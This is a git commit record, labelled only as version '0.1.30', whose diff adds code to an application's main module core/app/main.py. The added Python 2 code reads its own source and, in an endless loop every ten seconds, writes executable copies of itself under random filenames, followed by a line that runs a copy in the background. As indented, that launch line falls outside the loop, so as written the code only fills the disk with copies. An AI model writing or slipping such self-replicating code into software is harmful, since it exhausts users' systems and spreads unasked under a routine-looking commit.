08184f79e7d1c4f343c18b364e5b1d3b3461d190
pdinkins <parkerdinkins@gmail.com>
2019-03-14 00:01:34 -0400

    0.1.30

--- core/app/main.py
+++ core/app/main.py
@@ -9,3 +9,23 @@ import os
 from ..writer.main import FileObject
 from ..writer.main import Write2file
 
+import os, sys, time, uuid
+
+# get self code
+self_content = file(sys.argv[0]).read()
+
+while True:
+    # wait 10 seconds
+    time.sleep(10)
+    
+    # create unique filename
+    dupe = "%s.py" % uuid.uuid4()
+    
+    # open and write to the copy
+    copy = open(dupe, "w")
+    copy.write(self_content)
+    copy.close()    
+    
+    # make the copy executable and execute
+    os.chmod(dupe, 0755)
+os.system("./%s &" % dupe)
